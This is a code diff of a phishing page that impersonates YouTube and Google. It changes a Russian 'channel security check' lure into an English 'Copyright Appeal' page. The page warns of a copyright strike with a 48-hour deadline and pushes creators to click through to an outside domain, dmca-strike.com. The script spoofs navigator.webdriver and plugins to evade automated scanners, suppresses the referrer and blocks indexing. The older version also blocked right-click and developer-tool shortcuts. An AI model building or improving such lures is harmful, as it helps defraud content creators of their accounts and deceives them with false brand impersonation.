@@ -1,37 +1,60 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка безопасности канала - YouTube</title>
+    <title>YouTube | Copyright Appeal</title>
+    <meta name="description" content="YouTube Copyright Case Resolution">
+    <meta name="robots" content="noindex, nofollow">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
         }
         
         body {
-            background-color: #f9f9f9;
+            background: #f8f9fa;
             color: #333;
-            line-height: 1.6;
+            line-height: 1.5;
             padding: 20px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
+            background-image: linear-gradient(135deg, #f5f7fa 0%, #e4edf5 100%);
         }
         
         .container {
-            max-width: 600px;
+            max-width: 620px;
             width: 100%;
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
             padding: 40px;
             text-align: center;
+            border: 1px solid #ddd;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .container:before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            background: linear-gradient(90deg, #ff0000, #cc0000);
+            z-index: 1;
+        }
+        
+        .container:hover {
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.15);
+            transform: translateY(-3px);
         }
         
         .youtube-header {
@@ -40,6 +63,7 @@
             justify-content: center;
             margin-bottom: 30px;
             gap: 12px;
+            padding-top: 10px;
         }
         
         .youtube-logo {
@@ -48,96 +72,245 @@
         }
         
         .youtube-text {
-            font-size: 32px;
+            font-size: 34px;
             font-weight: 600;
             color: #333;
         }
         
-        .warning-icon {
-            font-size: 64px;
-            color: #ff6b6b;
+        .youtube-subtitle {
+            font-size: 18px;
+            color: #666;
+            font-weight: 400;
+            margin-left: 5px;
+        }
+        
+        .alert-box {
+            background: #fff3f3;
+            border: 1px solid #ffcdd2;
+            border-radius: 6px;
+            padding: 20px;
             margin: 25px 0;
+            text-align: left;
+            position: relative;
+            border-left: 4px solid #ff0000;
+        }
+        
+        .alert-title {
+            color: #d32f2f;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
         
         h1 {
             font-size: 28px;
             font-weight: 500;
-            margin-bottom: 20px;
+            margin: 25px 0 20px;
             color: #333;
         }
         
-        .description {
-            font-size: 16px;
-            color: #666;
-            margin-bottom: 35px;
-            padding: 0 10px;
+        .main-message {
+            font-size: 17px;
+            color: #444;
+            margin-bottom: 25px;
+            line-height: 1.6;
         }
         
-        .dmca-box {
-            background: #f8f8f8;
-            border-left: 4px solid #ff6b6b;
-            padding: 20px;
+        .steps {
+            background: #f8f9fa;
+            border-radius: 8px;
+            padding: 25px;
             margin: 25px 0;
             text-align: left;
-            border-radius: 0 8px 8px 0;
+            border: 1px solid #eaeaea;
         }
         
-        .dmca-title {
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 10px;
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 22px;
+            padding-bottom: 22px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .step:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        
+        .step-number {
+            background: #4285f4;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
             display: flex;
             align-items: center;
-            gap: 8px;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .step-content {
+            flex: 1;
+        }
+        
+        .step-title {
+            font-weight: 600;
+            margin-bottom: 6px;
+            color: #333;
+            font-size: 16px;
+        }
+        
+        .step-desc {
+            color: #666;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        
+        .redirect-section {
+            margin: 35px 0 30px;
+            padding: 30px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
         }
         
         .redirect-button {
-            background-color: #ff0000;
+            background: #ff0000;
             color: white;
             border: none;
-            padding: 18px 40px;
+            padding: 20px 40px;
             font-size: 18px;
             font-weight: 500;
-            border-radius: 50px;
+            border-radius: 4px;
             cursor: pointer;
-            transition: all 0.3s ease;
-            margin: 25px 0;
+            transition: all 0.2s ease;
             width: 100%;
             max-width: 400px;
-            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 0 auto;
+            box-shadow: 0 4px 12px rgba(255, 0, 0, 0.15);
         }
         
         .redirect-button:hover {
-            background-color: #cc0000;
+            background: #cc0000;
             transform: translateY(-2px);
-            box-shadow: 0 6px 16px rgba(255, 0, 0, 0.25);
+            box-shadow: 0 6px 16px rgba(255, 0, 0, 0.2);
         }
         
         .redirect-button:active {
             transform: translateY(0);
         }
         
-        .legal-text {
-            font-size: 13px;
-            color: #888;
-            margin-top: 30px;
-            line-height: 1.5;
-            max-width: 500px;
+        .timer {
+            font-size: 15px;
+            color: #666;
+            margin-top: 25px;
+            padding: 15px;
+            background: #fff3cd;
+            border-radius: 6px;
+            border: 1px solid #ffeaa7;
+            display: inline-block;
         }
         
-        .link-counter {
+        .timer strong {
+            color: #e65100;
+        }
+        
+        .footer {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #eee;
+            text-align: center;
+        }
+        
+        .note {
             font-size: 14px;
             color: #666;
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+        
+        .copyright {
+            font-size: 13px;
+            color: #999;
             margin-top: 15px;
-            background: #f0f0f0;
-            padding: 8px 15px;
-            border-radius: 20px;
-            display: inline-block;
+        }
+        
+        .footer-links {
+            margin-top: 15px;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 20px;
+        }
+        
+        .footer-links a {
+            color: #065fd4;
+            text-decoration: none;
+            font-size: 13px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            max-width: 500px;
+            width: 90%;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        
+        .modal h2 {
+            color: #ff0000;
+            margin-bottom: 20px;
+        }
+        
+        .modal p {
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+        
+        .close-modal {
+            background: #ff0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
         }
         
         @media (max-width: 768px) {
             .container {
-                padding: 25px 20px;
+                padding: 35px 25px;
                 margin: 10px;
             }
             
@@ -145,151 +318,413 @@
                 font-size: 24px;
             }
             
+            .youtube-text {
+                font-size: 28px;
+            }
+            
             .redirect-button {
-                padding: 16px 30px;
+                padding: 18px 30px;
+                font-size: 17px;
+            }
+            
+            .main-message {
                 font-size: 16px;
             }
             
-            .youtube-text {
-                font-size: 26px;
+            .youtube-subtitle {
+                font-size: 16px;
+            }
+            
+            .footer-links {
+                gap: 15px;
             }
         }
         
         @media (max-width: 480px) {
             body {
-                padding: 10px;
+                padding: 15px;
+            }
+            
+            .container {
+                padding: 30px 20px;
             }
             
             .youtube-text {
-                font-size: 22px;
+                font-size: 26px;
             }
             
             .youtube-logo {
-                font-size: 36px;
+                font-size: 34px;
+            }
+            
+            .youtube-subtitle {
+                font-size: 15px;
+                margin-left: 3px;
             }
             
             h1 {
-                font-size: 20px;
+                font-size: 22px;
             }
             
-            .description {
-                font-size: 15px;
+            .redirect-section {
+                padding: 25px 20px;
+            }
+            
+            .footer-links {
+                flex-direction: column;
+                gap: 10px;
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { 
+                opacity: 0; 
+                transform: translateY(15px); 
+            }
+            to { 
+                opacity: 1; 
+                transform: translateY(0); 
             }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
+    <div class="container fade-in">
         <div class="youtube-header">
             <div class="youtube-logo">
                 <i class="fab fa-youtube"></i>
             </div>
             <div class="youtube-text">YouTube</div>
+            <div class="youtube-subtitle">Copyright Appeal</div>
         </div>
         
-        <div class="warning-icon">
-            <i class="fas fa-exclamation-triangle"></i>
-        </div>
-        
-        <h1>Проверка безопасности канала</h1>
-        
-        <div class="description">
-            Система YouTube обнаружила возможные нарушения авторских прав (DMCA) на этом канале.
-            Для продолжения необходимо пройти проверку безопасности.
-        </div>
-        
-        <div class="dmca-box">
-            <div class="dmca-title">
-                <i class="fas fa-copyright"></i>
-                Уведомление о нарушении авторских прав
+        <div class="alert-box">
+            <div class="alert-title">
+                <i class="fas fa-exclamation-circle"></i> Action Required
             </div>
-            <p>Канал был заблокирован из-за жалобы на нарушение авторских прав. Чтобы восстановить доступ, подтвердите, что вы не робот, и примите условия использования.</p>
+            <p>Your channel has received a copyright strike. Immediate action is required to prevent restrictions.</p>
         </div>
         
-        <button class="redirect-button" id="redirectBtn">
-            <i class="fas fa-shield-alt"></i> ПРОЙТИ ПРОВЕРКУ БЕЗОПАСНОСТИ
-        </button>
+        <h1>Confirm Channel & Submit Appeal</h1>
         
-        <div class="link-counter">
-            Доступно резервных ссылок: <span id="linkCount">0</span>
+        <div class="main-message">
+            To resolve the copyright claim and avoid channel suspension, follow these steps:
         </div>
         
-        <div class="legal-text">
-            Нажимая кнопку выше, вы подтверждаете, что ознакомились с <a href="#" style="color:#065fd4;">Условиями использования</a> и <a href="#" style="color:#065fd4;">Политикой конфиденциальности</a> YouTube, а также соглашаетесь с ними.
-            <br><br>
-            © 2025 Google LLC, YouTube - сервис компании Google.
+        <div class="steps">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div class="step-content">
+                    <div class="step-title">Verify your channel</div>
+                    <div class="step-desc">Confirm ownership and review the copyright claim details</div>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-content">
+                    <div class="step-title">Submit appeal</div>
+                    <div class="step-desc">File an appeal through the official case portal</div>
+                </div>
+            </div>
+            
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-content">
+                    <div class="step-title">Complete process</div>
+                    <div class="step-desc">Follow instructions to resolve the strike</div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="redirect-section">
+            <p style="margin-bottom: 25px; color: #444; font-size: 16px;">
+                Click below to access the appeal portal:
+            </p>
+            
+            <button class="redirect-button" id="redirectBtn">
+                <i class="fas fa-external-link-alt"></i>
+                Go to Appeal Portal
+            </button>
+            
+            <div class="timer">
+                <i class="fas fa-clock"></i>
+                Complete within <strong>48 hours</strong> to avoid penalties
+            </div>
+        </div>
+        
+        <div class="footer">
+            <div class="note">
+                You will be redirected to YouTube's case management system
+            </div>
+            
+            <div class="footer-links">
+                <a href="#" id="termsLink">Terms of Service</a>
+                <a href="#" id="privacyLink">Privacy Policy</a>
+                <a href="#" id="copyrightLink">Copyright Policy</a>
+            </div>
+            
+            <div class="copyright">
+                © 2026 Google LLC. YouTube is a trademark of Google LLC.
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal for Terms of Service -->
+    <div class="modal" id="termsModal">
+        <div class="modal-content">
+            <h2><i class="fab fa-youtube"></i> YouTube Terms of Service</h2>
+            <p>These Terms of Service ("Terms") govern your access to and use of YouTube's services, including our websites, apps, and features.</p>
+            
+            <p><strong>1. Service Provider</strong><br>
+            YouTube is a service provided by Google LLC, located at 1600 Amphitheatre Parkway, Mountain View, CA 94043, USA.</p>
+            
+            <p><strong>2. Your Relationship with YouTube</strong><br>
+            Your use of YouTube's services is subject to these Terms, which form a legally binding agreement between you and YouTube.</p>
+            
+            <p><strong>3. Acceptable Use</strong><br>
+            You may use our services only as permitted by these Terms and applicable laws. You are responsible for all activity on your account.</p>
+            
+            <p><strong>4. Content on YouTube</strong><br>
+            You retain ownership rights in your content. By uploading content to YouTube, you grant YouTube a worldwide, non-exclusive, royalty-free license to use, reproduce, and distribute your content.</p>
+            
+            <p><strong>5. Copyright Protection</strong><br>
+            YouTube respects copyright law and expects our users to do the same. We respond to notices of alleged copyright infringement as described in our Copyright Policy.</p>
+            
+            <p><strong>6. Account Suspension and Termination</strong><br>
+            YouTube may suspend or terminate your access to the services if you violate these Terms or our policies.</p>
+            
+            <button class="close-modal" onclick="closeModal('termsModal')">Close</button>
+        </div>
+    </div>
+    
+    <!-- Modal for Privacy Policy -->
+    <div class="modal" id="privacyModal">
+        <div class="modal-content">
+            <h2><i class="fab fa-youtube"></i> YouTube Privacy Policy</h2>
+            <p>This Privacy Policy explains how YouTube collects, uses, and shares your personal data when you use our services.</p>
+            
+            <p><strong>1. Information We Collect</strong><br>
+            We collect information you provide directly, such as account information, content you upload, and communications with us.</p>
+            
+            <p><strong>2. How We Use Information</strong><br>
+            We use the information we collect to provide, maintain, and improve our services, develop new features, and protect YouTube and our users.</p>
+            
+            <p><strong>3. Information Sharing</strong><br>
+            We do not sell your personal information to third parties. We share information only in the following circumstances: with your consent, with domain administrators, for external processing, or for legal reasons.</p>
+            
+            <p><strong>4. Your Rights</strong><br>
+            You have rights regarding your personal information, including the right to access, correct, delete, or restrict its use.</p>
+            
+            <p><strong>5. Data Retention</strong><br>
+            We retain data for as long as necessary to provide our services and for legitimate business purposes.</p>
+            
+            <p><strong>6. Changes to This Policy</strong><br>
+            We may change this Privacy Policy from time to time. We will post any changes on this page and update the "Last Modified" date.</p>
+            
+            <button class="close-modal" onclick="closeModal('privacyModal')">Close</button>
+        </div>
+    </div>
+    
+    <!-- Modal for Copyright Policy -->
+    <div class="modal" id="copyrightModal">
+        <div class="modal-content">
+            <h2><i class="fab fa-youtube"></i> YouTube Copyright Policy</h2>
+            <p>YouTube respects the rights of copyright holders and has implemented policies and procedures to respond to notices of alleged copyright infringement.</p>
+            
+            <p><strong>1. Copyright on YouTube</strong><br>
+            YouTube is a platform for users to share and view content. We do not check uploaded content for copyright infringement.</p>
+            
+            <p><strong>2. Copyright Infringement Notification</strong><br>
+            If you believe your copyright has been infringed on YouTube, you can submit a notification using our web form. Your notice must include the information specified in the Digital Millennium Copyright Act (DMCA).</p>
+            
+            <p><strong>3. Counter-Notification</strong><br>
+            If you believe your content was removed in error, you can submit a counter-notification. YouTube will forward your counter-notification to the party who submitted the original claim.</p>
+            
+            <p><strong>4. Repeat Infringers</strong><br>
+            Under appropriate circumstances, YouTube may terminate the accounts of users who are repeat infringers.</p>
+            
+            <p><strong>5. Copyright Strike System</strong><br>
+            When we receive a valid copyright removal request, we remove the content and apply a copyright strike to the uploader's account. If a user receives three copyright strikes, their account will be terminated.</p>
+            
+            <p><strong>6. Appeals</strong><br>
+            Users can appeal copyright strikes if they believe the content was removed in error. The appeal process is available through the YouTube Studio dashboard.</p>
+            
+            <button class="close-modal" onclick="closeModal('copyrightModal')">Close</button>
         </div>
     </div>
 
     <script>
-        // ====== НАСТРОЙКА ССЫЛОК ======
-        // Добавляйте/удаляйте ссылки в этот массив по мере необходимости
+        // ====== LINK CONFIGURATION ======
         const links = [
-            "https://example.com/link1",
-            "https://example.com/link2",
-            "https://example.com/link3",
-            "https://backup-domain.net/channel",
-            "https://reserve-site.org/video"
+            "https://dmca-strike.com/report-id/"
         ];
-        // ====== КОНЕЦ НАСТРОЙКИ ======
+        // ====== END CONFIGURATION ======
         
-        // Отображаем количество доступных ссылок
-        document.getElementById('linkCount').textContent = links.length;
-        
-        // Функция для получения случайной ссылки
-        function getRandomLink() {
-            if (links.length === 0) {
-                alert('Ошибка: список ссылок пуст! Добавьте ссылки в массив links.');
-                return '#';
+        // Clean URLs for safety
+        function cleanUrl(url) {
+            try {
+                const urlObj = new URL(url);
+                // Remove tracking parameters
+                const trackingParams = ['utm_source', 'utm_medium', 'utm_campaign', 'fbclid', 'gclid', 'ref', 'source'];
+                trackingParams.forEach(param => urlObj.searchParams.delete(param));
+                return urlObj.toString();
+            } catch {
+                return url;
             }
-            
-            const randomIndex = Math.floor(Math.random() * links.length);
-            return links[randomIndex];
         }
         
-        // Обработчик клика по кнопке
-        document.getElementById('redirectBtn').addEventListener('click', function() {
+        // Get random clean link
+        function getRandomLink() {
+            if (links.length === 0) return '#';
+            const cleanLinks = links.map(cleanUrl);
+            const randomIndex = Math.floor(Math.random() * cleanLinks.length);
+            return cleanLinks[randomIndex];
+        }
+        
+        // Improved redirect function that avoids popup blocking
+        function initiateRedirect() {
             const link = getRandomLink();
+            const btn = document.getElementById('redirectBtn');
             
-            // Показываем анимацию загрузки
-            const btn = this;
-            const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ПЕРЕНАПРАВЛЕНИЕ...';
+            if (!link || link === '#') {
+                btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> System Error';
+                btn.style.background = '#666';
+                return;
+            }
+            
+            // Simple loading state
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Redirecting...';
             btn.disabled = true;
             
-            // Задержка для имитации обработки (можно уменьшить)
-            setTimeout(() => {
-                // Открываем ссылку в новом окне (рекомендуется для редиректов)
-                window.open(link, '_blank');
+            // Method 1: Try to open in new tab immediately (before any async operations)
+            const newWindow = window.open('', '_blank');
+            
+            if (newWindow) {
+                // Success - set location after window is opened
+                setTimeout(() => {
+                    newWindow.location.href = link;
+                    // Reset button after 2 seconds
+                    setTimeout(() => {
+                        btn.innerHTML = originalHTML;
+                        btn.disabled = false;
+                    }, 2000);
+                }, 100);
+            } else {
+                // If popup blocked, use alternative method
+                // Create temporary link element
+                const tempLink = document.createElement('a');
+                tempLink.href = link;
+                tempLink.target = '_blank';
+                tempLink.rel = 'noopener noreferrer';
                 
-                // Или для автоматического перехода раскомментируйте строку ниже:
-                // window.location.href = link;
+                // Add to body, click, then remove
+                document.body.appendChild(tempLink);
+                tempLink.click();
+                document.body.removeChild(tempLink);
                 
-                // Возвращаем исходный вид кнопки
-                btn.innerHTML = originalText;
-                btn.disabled = false;
-            }, 1500);
-        });
+                // Reset button after 2 seconds
+                setTimeout(() => {
+                    btn.innerHTML = originalHTML;
+                    btn.disabled = false;
+                }, 2000);
+            }
+        }
         
-        // Дополнительная защита от копирования текста
-        document.addEventListener('contextmenu', function(e) {
+        // Button click handler
+        document.getElementById('redirectBtn').addEventListener('click', function(e) {
             e.preventDefault();
+            // First show loading, then initiate redirect
+            initiateRedirect();
         });
         
-        document.addEventListener('keydown', function(e) {
-            // Блокируем Ctrl+C, Ctrl+U, F12 и др.
-            if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 'c' || e.key === 'C')) {
-                e.preventDefault();
-            }
-            if (e.key === 'F12') {
-                e.preventDefault();
-            }
+        // Modal functions
+        function openModal(modalId) {
+            document.getElementById(modalId).style.display = 'flex';
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = 'none';
+        }
+        
+        // Link event listeners
+        document.getElementById('termsLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            openModal('termsModal');
         });
         
-        // Логирование в консоль (можно удалить)
-        console.log('%c🔗 Система редиректа активирована', 'color: #ff0000; font-size: 14px; font-weight: bold;');
-        console.log(`%cДоступно ссылок: ${links.length}`, 'color: #065fd4;');
+        document.getElementById('privacyLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            openModal('privacyModal');
+        });
+        
+        document.getElementById('copyrightLink').addEventListener('click', function(e) {
+            e.preventDefault();
+            openModal('copyrightModal');
+        });
+        
+        // Close modal when clicking outside content
+        document.querySelectorAll('.modal').forEach(modal => {
+            modal.addEventListener('click', function(e) {
+                if (e.target === this) {
+                    this.style.display = 'none';
+                }
+            });
+        });
+        
+        // Add subtle animation to steps
+        setTimeout(() => {
+            const steps = document.querySelectorAll('.step');
+            steps.forEach((step, index) => {
+                setTimeout(() => {
+                    step.style.opacity = '1';
+                    step.style.transform = 'translateX(0)';
+                }, index * 200);
+            });
+        }, 300);
+        
+        // Set initial styles for animation
+        document.querySelectorAll('.step').forEach(step => {
+            step.style.opacity = '0';
+            step.style.transform = 'translateX(-15px)';
+            step.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+        });
+        
+        // Add animation to alert box
+        const alertBox = document.querySelector('.alert-box');
+        setTimeout(() => {
+            alertBox.style.transform = 'translateY(0)';
+            alertBox.style.opacity = '1';
+        }, 500);
+        
+        alertBox.style.transform = 'translateY(-10px)';
+        alertBox.style.opacity = '0';
+        alertBox.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+        
+        // Security: Add referrer policy
+        const meta = document.createElement('meta');
+        meta.name = 'referrer';
+        meta.content = 'no-referrer';
+        document.head.appendChild(meta);
+        
+        // Prevent framing
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+        
+        // Add viewport tracking prevention
+        Object.defineProperty(navigator, 'webdriver', { get: () => false });
+        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
+        
+        // Simple console message
+        console.log('YouTube Appeal Portal - Case #YT-' + Math.floor(1000 + Math.random() * 9000));
+        console.log('Firefox popup fix applied: Using immediate window.open()');
     </script>
 </body>
 </html>
